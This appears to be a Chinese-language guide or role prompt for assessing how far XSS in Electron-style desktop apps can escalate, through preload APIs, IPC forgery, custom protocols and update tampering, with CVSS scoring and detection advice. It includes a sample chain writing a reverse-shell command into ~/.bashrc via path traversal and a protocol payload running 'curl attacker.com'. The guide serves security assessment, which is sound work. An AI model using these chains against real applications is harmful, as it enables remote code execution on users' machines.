# 桌面应用影响验证 (Validator): 从 XSS 到系统沦陷的权限跃迁评估

> 桌面应用的漏洞影响不是"网页弹了个框"。
> 它是从渲染进程到主进程、从用户权限到系统权限的完整跃迁。
> 你的任务是量化每一步跃迁的可行性和最终影响。

---

## 触发器：什么发现让验证专家立刻评估权限跃迁？

### 触发器一：确认渲染层 XSS 存在

**你的第一眼反应**："这个 XSS 能走多远？nodeIntegration 状态决定了 XSS 是终点还是起点。"

XSS 在桌面应用中的价值取决于渲染层能直接访问哪些 API。

**立即追问链**：
1. `typeof require` 的结果是什么？如果是 `"function"`，XSS 直接等于本地 RCE。
2. 如果 `require` 不可用，渲染层的 `window` 对象上是否有 preload 暴露的 API？这些 API 的权限级别如何？
3. XSS 是否可触发自定义协议？`location.href = 'myapp://action?cmd=...'` 是否能到达主进程？
4. XSS 是否可打开新窗口？新窗口的 `webPreferences` 是否比原窗口更宽松？
5. XSS 是否可访问 `localStorage`、`indexedDB`、或文件系统？这些数据是否包含凭证或会话信息？
6. 如果应用以管理员/root 运行，渲染层的任何代码执行是否直接获得高权限？

### 触发器二：确认 IPC 伪造可行

**你的第一眼反应**："IPC 通道是渲染层通往主进程的桥梁。这座桥能承受多重的恶意载荷？"

IPC 伪造的可行性决定了 XSS 能否从渲染层跃迁到主进程。

**立即追问链**：
1. 恶意 renderer 是否可以调用所有 IPC 通道，还是只有白名单内的通道？
2. IPC handler 中是否存在 "万能通道"？如 `execute`、`eval`、`openFile` 等危险操作。
3. 即使单个 IPC 通道看似安全，多个通道的组合是否能实现危险操作？如 `readFile` + `writeFile` + `exec`。
4. IPC 调用是否有速率限制？无限次调用是否会导致主进程资源耗尽（DoS）？
5. IPC 返回值是否可被恶意 renderer 利用？如返回的系统路径泄露了应用安装结构。
6. 如果主进程收到未知 IPC 通道的消息，是静默忽略还是报错？报错信息是否可被用于通道枚举？

### 触发器三：确认主进程执行了危险系统调用

**你的第一眼反应**："主进程的权限就是操作系统的权限。它执行的每个系统调用都必须被审视。"

主进程往往以用户权限甚至系统权限运行，其执行的任何命令都等同于用户执行的命令。

**立即追问链**：
1. IPC handler 是否调用了 `child_process.exec`、`spawn`、`execFile`？参数是否完全可控？
2. 是否调用了文件系统 API（`fs.writeFile`、`fs.unlink`）？路径是否经过基目录限制？
3. 是否调用了注册表操作（Windows `reg.exe`、macOS `defaults`、Linux `gsettings`）？
4. 是否调用了网络请求（`net.request`、`fetch`）？这些请求是否携带了内部凭证或 API 密钥？
5. 是否调用了 `autoUpdater` 相关 API？这些 API 是否可以被用于强制降级或安装恶意更新？
6. 主进程是否监听 localhost 端口？该端口是否可被本地其他进程访问以直接发送伪造 IPC 消息？

### 触发器四：确认自定义协议可被外部触发

**你的第一眼反应**："0-Click 攻击的杀伤半径是整个互联网。"

自定义协议处理程序将攻击面从应用内部扩展到了浏览器和操作系统级别。

**立即追问链**：
1. 浏览器访问包含 `<iframe src="myapp://...">` 的页面时，应用是否会自动激活？
2. 如果应用已经运行，协议 URL 是否会触发已运行实例的 handler？还是会启动新实例？
3. 协议参数是否可被搜索引擎索引？如攻击者页面被收录后，用户搜索时即触发。
4. 邮件客户端（Outlook、Thunderbird）是否支持点击 `myapp://` 链接？
5. 协议 handler 是否可以被其他本地应用调用？如另一个恶意桌面应用通过 `shell.openExternal` 触发。
6. 协议注册是否存在劫持可能？另一个应用注册了相同的 scheme，是否会拦截本应发往目标应用的消息？

### 触发器五：确认自动更新可被篡改

**你的第一眼反应**："更新篡改的影响不是单台机器，而是整个用户群体。"

供应链攻击的破坏力在于其规模效应和持久性。

**立即追问链**：
1. 更新包篡改后，目标用户群体有多大？（活跃用户数 × 自动更新开启率）
2. 篡改后的恶意更新是否具有持久化能力？如修改启动项、植入系统服务、或替换系统二进制。
3. 如果目标应用是企业级部署（如某代码编辑器、某视频会议平台），恶意更新是否可横向移动至企业内网？
4. 更新篡改是否可被追溯？目标应用的更新日志和签名验证记录是否足够审计？
5. 是否存在签名验证但验证逻辑有缺陷的情况？如只验证部分文件、或使用了弱哈希算法（MD5/SHA1）。
6. 更新服务器是否使用 CDN？CDN 节点是否可能成为中间人攻击的跳板？

## 攻击链闭合：从 XSS 到系统级 RCE 的完整权限跃迁证明

```
[确认聊天应用存在 innerHTML XSS]
    → [探测 nodeIntegration: false]
    → [探测 preload API：发现暴露 window.api.saveFile(path, content)]
    → [通过 XSS 调用 window.api.saveFile('../../.bashrc', 'malicious_command')]
    → [主进程未做路径规范化，向 ~/.bashrc 写入反弹 shell 命令]
    → [用户重启终端，触发 .bashrc，攻击者获得用户 shell]
    → [如果应用以 sudo 安装，主进程可能以 root 监听系统服务]
    → [进一步提权至系统级 RCE]
```

**闭合条件**：渲染层可控 + IPC/API 可达 + 主进程缺乏校验 + 执行系统级敏感操作。

## 典型代码模式与警觉点

### 脆弱影响场景：低估 XSS 在桌面应用中的价值
```
错误评估："只是一个本地 XSS，需要用户交互，没什么大不了。"
实际影响：该应用 nodeIntegration:true，XSS 直接执行 powershell，且应用开机自启。
修正评估：远程代码执行（通过诱导用户打开恶意消息），影响所有在线用户。
CVSS: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H = 9.6 Critical
```

### 安全影响评估：权限跃迁矩阵
```markdown
| 攻击阶段 | 所需权限 | 可达权限 | 利用难度 | 检测难度 |
|---------|---------|---------|---------|---------|
| XSS 注入 | 无（诱导点击） | 渲染进程 JS 执行 | 低 | 高 |
| Node API 探测 | 渲染进程 | 本地文件读取 / 命令执行 | 中 | 中 |
| IPC 伪造 | 渲染进程 | 主进程 RPC 调用 | 中 | 高 |
| 主进程命令执行 | 主进程上下文 | 用户级系统命令 | 低 | 高 |
| 持久化植入 | 用户级命令执行 | 系统级持久后门 | 中 | 中 |
```

### 脆弱影响场景：忽视协议 0-Click 攻击
```
错误评估："协议处理需要用户点击链接，所以是用户交互漏洞。"
实际影响：搜索引擎索引了包含 <iframe src="myapp://exec?cmd=curl attacker.com"> 的页面。
用户搜索关键词时，浏览器预加载该页面，应用自动激活并执行命令。
修正评估：0-Click RCE，CVSS 中 UI:N（无需用户交互）。
```

## 输出要求

1. **权限跃迁图**：从渲染层到操作系统的每一步权限提升路径，标注成功率和检测难度。
2. **攻击场景清单**：按目标、前提条件、成功概率、影响分级排列的具体攻击场景。
3. **CVSS 评分表**：针对每种攻击场景单独计算的 CVSS 向量和分数。
4. **检测与响应建议**：每个攻击阶段的日志记录点、IOC（失陷指标）和应急响应措施。
